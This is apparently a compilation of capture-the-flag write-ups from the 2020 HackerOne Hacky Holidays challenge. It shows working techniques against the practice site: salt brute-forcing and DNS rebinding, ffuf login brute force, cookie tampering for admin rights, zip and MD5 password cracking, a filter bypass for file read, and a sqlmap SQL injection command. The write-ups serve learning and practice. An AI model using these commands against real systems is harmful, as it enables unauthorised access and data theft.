
```bash
$ echo '{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}' | base64 -w 0
eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQo=
```

Navigating to the original link but with the payload swapped out for the one I generated above resulted in an error:

```
Invalid Protection Hash
```

In order to supply my own target, I needed to also provide a valid `hash` parameter. So what could this be? The most likely setup was this hash was generated from a combination of the `target` value and a secret salt, which I didn't know.

However, I had a valid example with a `target` and it's associated `hash`, so I could try to brute force the salt.

I wrote a quick bit of Go for speed, and loaded up rockyou.txt as my wordlist. This created MD5 hashes of `203.0.113.33` appended to each word in the wordlist, and each word in the wordlist appended to `203.0.113.33` i.e. md5("${ip}${salt}") and md5("${salt}${ip}"). It would stop when a produced hash matched the epxected one: `5f2940d65ca4140cc18d0878bc398955`.

```go
package main

import (
	"bufio"
	"crypto/md5"
	"fmt"
	"io"
	"os"
)

const target = "5f2940d65ca4140cc18d0878bc398955"
const input = `203.0.113.33`

func main() {
	file, err := os.Open("/home/liamg/Downloads/rockyou.txt")
	if err != nil {
		panic(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		salt := scanner.Text()
		if hash(input+salt) == target {
			panic("Found salt md5(input+salt): " + salt)
		}
		if hash(salt+input) == target {
			panic("Found salt md5(salt+input): " + salt)
		}
	}

	if err := scanner.Err(); err != nil {
		panic(err)
	}

	panic("FAILED")
}

func hash(i string) string {
	h := md5.New()
	io.WriteString(h, i)
	return fmt.Sprintf("%x", h.Sum(nil))
}
```

After 30 seconds or so, this program spat out the salt!

```
Found salt md5(salt+input): mrgrinch463
```

Amazing! Now I had the means to make the DDoS system trust my payload and take `127.0.0.1` as a parameter, forcing it to launch an attack on itself!

```bash
$ echo -n "mrgrinch463127.0.0.1" | md5sum
3e3f8df1658372edf0214e202acb460b  -
```

Assembling the payload:

```bash
$ echo '{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}' | base64 -w0
eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQo= 
```

Trying it out on the endpoint:

{F1134511}

The system detected the target was local and cancelled the attack.

I decided to try `127.0.0.2`, which will also point at the local machine via loopback. This worked, and the attack was launched, but it was an unintended solution, as I didn't get presented with the flag:

{F1134509}

I went back to the drawing board to try and find the intended route. The attack script looked like it did a couple of things. First of all it got "host information", which I assumed meant resolving a hostname to an IP address and deciding if it was a local IP. Next it launched an attack on the given address.

After a bit of trial and error, I tried a DNS rebind attack. If I could provide a hostname which resolved to an "external" IP on the first step, but then resolved to `127.0.0.1` on the second, the check would pass and an attack would be launched on the local machine.

I built a payload using the `7f000001.c0a80001.rbndr.us` address provided by [taviso/rbndr](https://github.com/taviso/rbndr), which will constantly switch between resolving to 192.168.0.1 and 127.0.0.1:

```
https://hackyholidays.h1ctf.com/attack-box/launch/?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9Cg==
```

After several attempts trying to get things to resolve in the desired order:

{F1134507}

...and...

{F1134510}

Mission accomplished! I have successfully pinged (pung?) the Grinch Networks servers to death!

Flag: `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`

## Thanks!

Thanks very much to those who put the challenge together, I had a great time and learned a few new tricks! Also, I hate you just a little bit for flag 11. <3.

## Impact

Hopefully a $500 bounty ;)

---

### [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335)

- **Report ID:** `1069335`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** h1-ctf
- **Reporter:** @nytr0gen
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T22:05:23.798Z
- **CVE(s):** -

**Vulnerability Information:**

{F1139789}

# Challenge I 🤖

"What are you doing?" I asked myself. I was about to trespass a clear warning to **keep out**.

{F1139744}

"Have you lost your mind?" But I couldn't help it. I was born for this. And I wasn't going to back down. There are 12 more days until Christmas Eve, and I wasn't going to let a green furry dude destroy everything.

Let me backtrack a few days earlier. I minded my own business, prepping the Christmas tree on an old Elvis Presley album. I had planned holidays for my family and me, for a much-deserved getaway together.

Somehow I ended up on Twitter, just checking up on things from all my favorite hackers.

Suddenly my mood changed when I saw this tweet. [This Grinch](https://twitter.com/adamtlangley) with [his malefic little helper](https://twitter.com/nahamsec) made an evil plan to destroy everything. Not just my holidays. Everyone's holidays!

{F1139797}

I had to step up and stop it! I had **to save Christmas**! It is my duty!

Back to the present moment, I had to trespass the property to have a fighting chance. But there was nothing there, not a door or a crack on the wall.

I checked the **robots.txt** file for more clues. Luckily, the green beast left a trail.

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

Web developers use this file to tell Web Crawlers what files/directories to avoid when indexing a website. Our friend here kept himself safe from these crawlers but instead leaked the path to finding him and his plan.

I solved the first riddle, but I will not rest. Not until I save the holy day!

# Challenge II 🔎

{F1139746}

11 days until Christmas!

The furry monster left a trail. I followed that path directly into a trap. It appears I have underestimated my enemy.

{F1139747}

Is there nothing here to be found that could help me further? I took out my magnifying glass to *inspect the elements*. There must be a hint of where to look next!

{F1139745}

I found the second flag, which brings me closer to saving the world!

"This isn't possible!" I exclaimed. I found the flag in DevTools, but I couldn't find it anywhere in the source code.

"How does it appear? What am I missing?" The only thing I haven't checked is the `jquery.min.js` file. But that couldn't be. That's a standard framework.

I had to look. And there it was, entirely hidden inside jQuery code.

```js
h1_0 = 'la';
h1_1 = '}';
h1_2 = '';
h1_3 = 'f';
h1_4 = 'g';
h1_5 = '{b7ebcb75';
h1_6 = '8454-';
h1_7 = 'cfb9574459f7';
h1_8 = '-9100-4f91-';
document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
```

The next step was clear now. This wasn't a trap, after all. At this point, I was starting to believe that the Grinch wanted to be found?! Maybe he doesn't want to be a mean person, after all. Perhaps it's a phase, and he needs some help. I was going to find out.

# Challenge III - People Rater 📑

{F1139749}

The Grinch is not stopping. And neither am I. There's this phone call from Taken that comes to mind:

> I don't know who you are. I don't know what you want. If you are looking for ransom, I can tell you I don't have money, but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you let Santa Claus go now, that'll be the end of it. I will not look for you, I will not pursue you, but if you don't, I will look for you, I will find you, and I will save Christmas.

For today's challenge, the green thing has leaked his list of people that he hates with motivation for each one of them. Grinch and Santa Claus seem to be sharing habits.

I started analyzing the application. I'm struck by the fact that the list is so long! This list has 16 persons that may have done nothing wrong.

{F1139751}

When clicking on a person, the application makes a GET JSON request to `https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=`, with an ID for each person.

The ID is encoded in Base 64. Usually, to decode this, I use `bash` directly. Sometimes [CyberChef](https://gchq.github.io/CyberChef/) for more complicated stuff. And lately, with the new Burp updates, the Inspector.

```bash
> echo 'eyJpZCI6Mn0=' | base64 -d
{"id":2}
```

Hmm! The decoded string contains the ID for the first person on the list, named Tea Avery. And the ID for the last person is `'eyJpZCI6MTd9' == b64('{"id":17}')`.

That raises some questions! Who has the number 1 ID? Let's send a request with the Burp Repeater. The encoded ID should be `b64('{"id":1}') == 'eyJpZCI6MX0='`.

{F1139748}

**I found him.** Now some proper rest is required because tomorrow something more challenging will come.

Quick Note on Burp Suite: If you're starting in the Bug Bounty journey, my recommendation is to use the [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload) until you get your first bounty that covers the cost of Burp Suite Pro. That's how I did. That's how many bug hunters I know have done it. Keep the costs low in the beginning. The Community Edition has all the features you need to get a jump start.

# Challenge IV - Swag Shop 🛒🍪

{F1139754}

Is this the next challenge? Because I really need a new Christmas hoodie.

{F1139752}

Only 3 items in store for now. Nothing fancy in the source code. The application makes a get JSON request to `/swag-shop/api/stock`. I didn't find any parameters and no other items.

In moments like this, I pull out my little friend [`ffuf`](https://github.com/ffuf/ffuf) and start ramming at things. *P.S. I do not recommend using as many threads as I am outside of CTF competitions. Always check the policy of the bounty program you are participating in.*

I used the `common.txt` wordlist from [SecLists](https://github.com/danielmiessler/SecLists). Now let me share a trick from my toolbox. It's pretty annoying to write the paths to wordlists so many times. But I also don't like to use a wrapper for directory busting because I want to take advantage of `ffuf` options. So I'm using variables in bash for the most used wordlists, and they're saved in `.bashrc`/`.zshrc`.


```bash
> export COMMONDIR="$HOME/tools/SecLists/Discovery/Web-Content/common.txt"
> ffuf -u 'https://hackyholidays.h1ctf.com/swag-shop/FUZZ' -w $COMMONDIR -t 100 -c -mc all -fc 404

        /'___\  /'___\           /____\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/FUZZ
 :: Wordlist         : FUZZ: /home/robert/tools/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

api                     [Status: 200, Size: 23, Words: 2, Lines: 1]
:: Progress: [4661/4661] :: Job [1/1] :: 665 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

First, let's dive into the parameters I used for ffuf. My favorite is `-c` because it colorizes the output. The number of threads is set with `-t`.

And the magic happens with `-mc all` and `-fc 404`. I noticed that `404` is the status code for nonexisting directories/files on this application. This is very common. The parameter `-fc 404` filters out any response with a 404 status code. Also, `-mc all` matches all status codes. I need this because, by default, ffuf matches only a handful of status codes.

Back to the grinching. I already found that `/api` endpoint. Maybe is something hidden there? Time for another ffuf.

```bash
> ffuf -u 'https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ' -w $COMMONDIR -mc all -fc 404
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
```

I know `/api/stock` already. This is the one that's requested from the application page for the items.

What about `/api/sessions`? This one should be interesting.

```js
> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/sessions' | jq
{
  "sessions": [
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
    "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
  ]
}
```

Base64 again. This seems to be a common thread with the evil Grinch. Just copy the JSON response to https://gchq.github.io/CyberChef/ and choose `From Base64`. That recipe will skip any non-base64 characters and decode the good ones. This helps the lazy ones like me.

In the decoding, each session is a JSON object with keys `user` and `cookie`. Each session has a cookie, but only one of them has a `user` key.

```json
{
    "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
    "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
```

Decoding the base64 from the cookie points to a hex string of 128 characters. Decoding the hex string results in binary data, so my guess is that's a hash.

This seems to be a dead-end, and I'm in a hurry to find the Grinch.

What about the `/api/user` endpoint?

```bash
> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/user' | jq
{
  "error": "Missing required fields"
}
```

That's something. To find hidden parameters, I am using [Arjun](https://github.com/s0md3v/Arjun) because it's speedy and has excellent visual effects.

```bash
> cd ~/tools/Arjun
> python3 arjun.py -u 'https://hackyholidays.h1ctf.com/swag-shop/api/user'
    _
   /_| _
  (  |/ /(//) v2.0-beta
      _/

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] name: uuid, factor: http code
```

It found the parameter `uuid`. I've seen a UUID before in the sessions. I tried it!

```bash
> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' | jq
{
  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username": "grinch",
  "address": {
    "line_1": "The Grinch",
    "line_2": "The Cave",
    "line_3": "Mount Crumpit",
    "line_4": "Whoville"
  },
  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

{F1139753}

I successfully doxed the big nasty green fluffy monster. He won't know what's coming! And I still want my hoodie.

# Challenge V - Secure Login 🐏

{F1139760}

I need to get inside the secret area. The application has a login page with username and password, and nothing more.

{F1139755}

I tried directory bruteforcing, nothing was found. Tried parameters, got nothing again. Then I tried [SQL Injection to bypass the authentication](https://portswigger.net/support/using-sql-injection-to-bypass-authentication) step. This is a really old school attack, but it didn't work...

Trying the login, I noticed that I am able to enumerate usernames. The error when trying anything is `Invalid Username`. This means I can possibly try bruteforcing usernames.

Let's get the good old ffuf out for this one. If you own a Burp Pro license, you can use the Intruder for this one. I recommend reading [this excellent article](https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html) at some point because the next command is going to be HUGE.

```bash
> ffuf -u 'https://hackyholidays.h1ctf.com/secure-login' \
    -w $HOME/tools/SecLists/Usernames/xato-net-10-million-usernames-dup.txt \
    -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
    -d 'username=FUZZ&password=test' \
    -fr 'Invalid Username'

access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Let's dive into this monster. I chose a big wordlist for usernames from SecLists. After I got a hit, I stopped ffuf from running. Hopefully, I will need only one username.

Now the cool part. I had to send a POST request with **username** and **password**. That's done by setting the method via `-X` parameter to POST. Then setting the Content-Type header to `application/x-www-form-urlencoded` with the `-H` parameter. Then setting the POST data to `username=FUZZ&password=test`. **FUZZ** is the magic word here.

And the last parameter, named **Filter regexp**, will filter out any response with `Invalid Username`.

I tried using the username found, only to be met with a new error.

{F1139758}

I feel like I'm making progress here. Let's do the same thing, now for the password. And I chose the edgiest wordlist I could find for passwords!

```bash
> ffuf -u 'https://hackyholidays.h1ctf.com/secure-login' \
    -w $HOME/tools/SecLists/Passwords/darkweb2017-top1000.txt \
    -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
    -d 'username=access&password=FUZZ' \
    -fr 'Invalid Password'

computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Ok! Let's try this out! I logged in with the username **access** and the password **computer**. I wasn't expecting what came next.

{F1139756}

Seems I've been tricked again by the Grinch. Luckily this took much less time to figure out. There was nothing on the page (source code, javascript files).

I noticed the cookie has an interesting format. It's a Base 64 for a session cookie.

{F1139757}

What if I change the **admin** parameter in the JSON to **true**? Magic hopefully happens! *Did I mention how much I enjoy the Inspector functionality from Burp?! It's really awesome*

The new cookie should look like this:

```
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```

And magic does happen. Sending a request to the page with session cookie reveals a secret file at https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip (in case the server will be shut down, this is the archive {F1139792}).

Well, that's juicy! What could the fluffy beast hide in here? I downloaded the file and tried to read the contents, but they are password-protected... Let's try to use [John the Ripper](https://www.openwall.com/john/) for this one.

```bash
> 7z l my_secure_files_not_for_you.zip
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-12-16 18:41:29 .....       215058       215105  xxx.png
2020-12-16 18:22:20 .....           43           55  flag.txt
------------------- ----- ------------ ------------  ------------------------
2020-12-16 18:41:29             215101       215160  2 files

> zip2john my_secure_files_not_for_you.zip > zip.hashes
ver 2.0 efh 5455 efh 7875 my_secure_files_not_for_you.zip/xxx.png PKZIP Encr: 2b chk, TS_chk, cmplen=215105, decmplen=215058, crc=277DEE70
ver 1.0 efh 5455 efh 7875 my_secure_files_not_for_you.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=55, decmplen=43, crc=9DE7C581

> john --show zip.hashes
my_secure_files_not_for_you.zip:hahahaha::my_secure_files_not_for_you.zip:flag.txt, xxx.png:my_secure_files_not_for_you.zip
```

It didn't take much to get the password.

```
> unzip -P hahahaha my_secure_files_not_for_you.zip
Archive:  my_secure_files_not_for_you.zip
  inflating: xxx.png
 extracting: flag.txt

> cat flag.txt
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

Will I catch the Grinch in time? Things are getting harder by the day.

# Challenge VI - My Diary 📅

Good morning to everyone following the Anti Grinch Adventures! The challenge for today is the personal Diary of the big man himself, Mr. Grinch.

{F1139796}

The first step is to analyze the application. And directory bruteforcing, of course.

{F1139759}

Dirbusting returned with nothing. Analyzing the URL, I observed a `template` parameter with the value `entries.html`.

```
> ffuf -u 'https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ' -w $COMMONDIR -fc 302
index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
```

I checked out the page at [/my-diary/?template=index.php](https://hackyholidays.h1ctf.com/my-diary/?template=index.php), and it's a full-on Source Code Leak. Wowza! The Grinch really needs some help with the security of his services!


```php
<?php
if (isset($_GET["template"])) {
    $page = $_GET["template"];
    // remove non allowed characters
    $page = preg_replace("/([^a-zA-Z0-9.])/", "", $page);
    // protect admin.php from being read
    $page = str_replace("admin.php", "", $page);
    // I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php", "", $page);

    if (file_exists($page)) {
        echo file_get_contents($page);
    } else { // redirect to home
        header("Location: /my-diary/?template=entries.html");
    }
}
```

From this code, I figured out that the important thing we want to get is `secretadmin.php`. It can't be accessed directly. Path Traversal is completely blocked with the first `preg_replace`, because `/` is not allowed.

This is a common case of bad filtering. In this scenario, I can't use **admin.php** directly as the value. But I can use **ad**==admin.php==**min.php**. The value from inside will be removed, but because the replacement is not applied recursively, the value from outside will stay as-is.

It gets a bit more complicated with **secretadmin.php** because it contains the word **admin.php**. My solution is the following **secretad**==secretad==_admin.php_==min.php==**min.php**.

{F1139761}

Now I know what the Grinch is planning! **Launch DDoS Against Santa's Workshop!** on the 23rd of December. That's the evilest thing a hacker Grinch can do!

# Challenge VII - Hate Mail Generator 📫

{F1139800}

The application is quite interesting. It contains a page listing the email campaigns that have been sent—the possibility of creating new email campaigns and previewing them. Sending an email campaign doesn't work.

{F1139763}

The templating code looks similar to Mustache or Jinja2. So naturally, I thought of Server-Side Template Injection and consulted the faithful documentation of [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection). But sadly, nothing worked.

Running out of ideas this quick, I ran a directory bruteforce:

```bash
> ffuf -u 'https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ' -w $COMMONDIR -mc all -fc 404
new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
```

I know what `/new` endpoint does. But the `/templates` is still unknown. Visiting https://hackyholidays.h1ctf.com/hate-mail-generator/templates, I bump into a public directory listing.

{F1139764}

It's disclosing 3 files. They can't be accessed directly. And the header and footer files have been used before in the campaign that has already been sent by the Grinch. The other template, namely `38dhs_admins_only_header.html`, wasn't used anywhere yet and seems a bit private.

I started playing with the mail generator preview and the `{{template:..}}` functionality in the Burp Repeater. Protip: It's a lot easier to use the multipart encoding when sending POST requests if the application accepts it because this way, I avoid URL encoding/decoding.

{F1139766}

| Markup      | Status |
| ----------- | ----------- |
| {{template:**cbdj3_grinch_header.html**}} | **Works** |
| {{template:**cbdj3_grinch_footer.html**}} | **Works** |
| {{template:**38dhs_admins_only_header.html**}} | You do not have access |
| {{template:**./cbdj3_grinch_header.html**}} | Cannot find template file /templates/.cbdj3_grinch_header.html |
| {{template:**../templates/cbdj3_grinch_header.html**}} | Cannot find template file /templates/..templatescbdj3_grinch_header.html |
| {{template:**./test/../cbdj3_grinch_header.html**}} | Cannot find template file /templates/.test..cbdj3_grinch_header.html |
| {{template:**{{name}}**}} | Missing key name}} in dataset |

The last one might be interesting. I added `name}}` to the dataset, and the result was `{{template:test`. Then playing with this payload appended to one of the initial markups, I found it quite interesting that it had different behavior.

{F1139810}

This one took a bit of luck to exploit.

# Challenge VIII - Forum 💬

{F1139798}

Analyzing the application and running directory bruteforce. The usual start.

{F1139767}

Looks like a simple forum. But the results from ffuf reveal an interesting endpoint at `/phpmyadmin`. The Security Team from Grinch Networks missed this important application. I tried default credentials with `root:root` and some simple combinations but with no luck.

{F1139811}

I tried a lot of stuff on the forum application and the login. I tried to send post requests directly to the endpoints. I tried bruteforcing for parameters. I tried looking for leaks in the source code. There was nothing!!!

I figured what the hell, let's try Google Dorks for "Grinch Networks". I've been collecting interesting Google Dorks for a while now from Twitter, and I rarely get to use them. Here is my list {F1139812} and I usually use a bash replace and open them all up with Google Chrome from the command line.

One with interesting results was [site:github.com grinch networks](https://www.google.com/search?q=site:github.com+grinch%20networks). The first result was the [Github of the Grinch](https://github.com/adamtlangley). He contributed to a repository named [**Forum**](https://github.com/Grinch-Networks/forum) in the **Grinch-Networks** organization. \*The plot thickens!\*

I cloned the repository locally and started source code review. Weird, but the application looks really tight. Nothing vulnerable that could be used to help Santa.

I checked the commits on GitHub because there were only 4 of them. So I clicked on each one, one by one. The second commit includes the username and password for the database. YES!!

{F1139813}

And the credentials worked on https://hackyholidays.h1ctf.com/forum/phpmyadmin. There are 4 tables.

| Table | Rows |
| ----- | :--: |
| comment | N/A |
| post | N/A |
| section | N/A |
| user | 2 |

Only the `user` table is accessible and contains two rows.

| id  | username | password | admin |
| :-: | -------- | -------- | :---: |
| 1  | grinch | 35D652126CA1706B59DB02C93E0C9FBF | 1 |
| 2  | max | 388E015BC43980947FCE0E5DB16481D1 | |

I'm usually in hyperdrive when I find things like this. I went fast, fast, fast to the next step and the next step like in a trance!

The password looks like an MD5. I try these with online services like https://hashtoolkit.com/ and https://crackstation.net/. Only the second online hash cracker worked and found **BahHumbug** for the grinch's password.

For anyone wondering what the word means, like myself, here is the definition from [Urban Dictionary](https://www.urbandictionary.com/define.php?term=Bah%20Humbug):

> An expression used to show disgust at the Christmas season, made famous by the fictional character Ebinizer Scrooge in the Charles Dickens novel 'A Christmas Carol'.
>
> *Guy: I love Christmas, Don't you, Mr. Scrooge?*
> *Scrooge: Bah Humbug*

I logged in at https://hackyholidays.h1ctf.com/forum/login with `grinch:BahHumbug` credentials and accessed the Secret Plans.

{F1139817}

The Grinch must be stopped!

# Challenge IX - Evil Quiz ❓

{F1139773}

I think the Grinch may have started recruiting for his evil army. I started analyzing the application and bruteforcing for directories.

{F1139770}

The only inputs here are the name and the answers to the quiz. There isn't much room to mingle. My first thought was Blind Cross-Site Scripting. I use [XSS Hunter](https://xsshunter.com/) for this, and I _spray and pray_.

Nothing happened. It was time to rethink my approach!

I observed an interesting little thing on the last page of the quiz.

> There is 56 other player(s) with the same name as you!

My spidey-senses told me this might be an [SQL Injection](https://portswigger.net/web-security/sql-injection)? There's only one way to find out. Try a bunch of
basic payloads until something works!

| Name | Num of Players |
| ---- | :------------: |
| test | 56 |
| grinch | 17 |
| reallyuniquename1283823 | 1 |
| nytr0gen | 1 |
| test' | 0 |
| test" | 1 |

So far, I can see that any name will have at least one other player with the same name. This means that the query is not filtering out my quiz response. But then, why does `test'` responds with **0** instead of **1**.

I think the query looks something like this.

```sql
SELECT COUNT(*)
FROM quiz_answers
WHERE name = '$input_name'
```

In this scenario, a double quote will not affect the response, but a single quote will break it. This means that if I send `test' or 1='1`, the answer will not be 1 or 0; it will be the total number of answers!

{F1139771}

Note: I took the liberty of answering like a Grinch soldier would to this quiz, just to see what happens.

And it worked! This looks like a Boolean-based SQL Injection. It's time to use [sqlmap](http://sqlmap.org/) to help me with dumping data from the database! I'm not the best at using this tool, and I have consulted the [documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage) a lot to do this. I do prefer it because it's really useful for dumping everything.

The other option would have been to write a script to make both requests, and write all the queries by hand, then have a binary search for the characters—kind of boring.

```bash
sqlmap -u "https://hackyholidays.h1ctf.com/evil-quiz" \
    --data="name=nytr0gen" \
    --cookie="session=25677e0c322966d2d4cc71b2c3e49e86" \
    --drop-set-cookie --ignore-redirects \
    -p name --dbms=mysql --prefix="'" \
    --technique=B \
    --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" \
    --string="is 1 other" \
    --proxy="http://localhost:8080/" \
    --save=$PWD/quiz.conf
```

This is the mighty initial command. Let's break it down.

- The parameter `-u` is for the target URL
- The parameter `--data` is attaching the POST data parameters
- The parameter `--cookie` is for setting the cookie. The vulnerable parameter `name` is attached to the session. To be able to see the response in the second request, the cookie needs to be preserved. Note: I used my cookie session after completing the quiz, and it seems it is the only way it works to bypass the actual quiz and make only 2 requests instead of 3.
- The parameter `--drop-set-cookie` is to ignore the set-cookie header after the POST request.
- The parameter `--ignore-redirects` is to ignore the redirect to completing the quiz.
- The parameter `-p` is to point to the vulnerable parameter.
- The parameter `--dbms` is to help sqlmap a little by setting the correct database. My assumption is that it's MySQL.
